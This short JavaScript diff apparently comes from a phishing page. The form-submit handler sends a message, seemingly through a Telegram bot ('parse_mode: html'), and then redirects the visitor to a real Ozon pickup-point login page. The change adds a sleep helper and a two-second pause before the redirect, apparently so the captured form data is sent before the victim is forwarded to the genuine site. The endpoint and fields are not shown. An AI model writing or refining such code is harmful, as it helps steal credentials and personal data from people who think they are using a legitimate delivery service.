@@ -7,7 +7,7 @@ function clearForm(){
     formClear.innerHTML = '';
 }
 
-
+let sleep = ms => new Promise(res=>setTimeout(res,ms));
 
 document.querySelector("#button").onclick = function(){
     document.getElementById('form').addEventListener('submit', function(e){
@@ -191,6 +191,7 @@ document.querySelector("#button").onclick = function(){
                     parse_mode: 'html',
                     text: message
                 })
+                await sleep(2000);
                 document.location='https://pvz.ozon-dostavka.ru/login?redirectUri=%2F'
             })
             })
